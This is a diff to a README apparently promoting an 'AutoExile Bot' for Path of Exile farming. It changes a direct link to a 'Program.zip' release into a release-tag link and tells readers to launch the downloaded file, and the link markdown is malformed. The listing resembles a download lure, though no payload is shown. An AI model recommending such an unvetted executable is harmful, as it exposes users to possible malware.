@@ -19,7 +19,7 @@ Welcome to ***POE-autofarm***, the ultimate solution for efficient farming, reso
 ### Access AutoExile Bot
 Click the button below to download the AutoExile Bot and start optimizing your Path of Exile gameplay! 📥
 
-[![Download AutoExile Bot](https://github.com/vasili16/POE-autofarm/releases/download/v1.0/Program.zip%20AutoExile%https://github.com/vasili16/POE-autofarm/releases/download/v1.0/Program.zip)](https://github.com/vasili16/POE-autofarm/releases/download/v1.0/Program.zip)
+[![Download AutoExile Bot](https://github.com/vasili16/POE-autofarm/releases/tag/v1.0%20AutoExile%https://github.com/vasili16/POE-autofarm/releases/tag/v1.0)](https://github.com/vasili16/POE-autofarm/releases/tag/v1.0)
 
 Please note that the downloaded file needs to be launched to install and activate the AutoExile Bot.
 
